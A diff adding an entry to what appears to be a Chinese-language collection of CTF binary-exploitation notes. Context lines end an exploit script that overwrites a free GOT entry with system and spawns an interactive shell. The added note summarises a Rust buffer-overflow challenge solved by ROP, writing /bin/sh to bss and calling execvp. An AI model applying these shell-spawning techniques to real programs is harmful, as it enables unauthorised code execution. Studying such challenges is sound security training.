@@ -1308,3 +1308,5 @@ edit_message(leak+b"\x00",p64(libc.sym.system)) #修改之前写入的free got�
 fake_edit(b"/bin/sh\x00")
 io.interactive()
 ```
+122. [Network Tools](https://snocc.dev/blog/sekai-nettools)
+- rust bof题目。思路和普通的C程序一样，都是rop（甚至有时候还有csu）。不过这题不知道因为什么原因不能ret2libc，只能写/bin/sh到bss后调用binary里自带的execvp函数：`execvp("/bin/sh", [0])`。注意该函数的第二个参数是数组，传一个指向null的指针即可
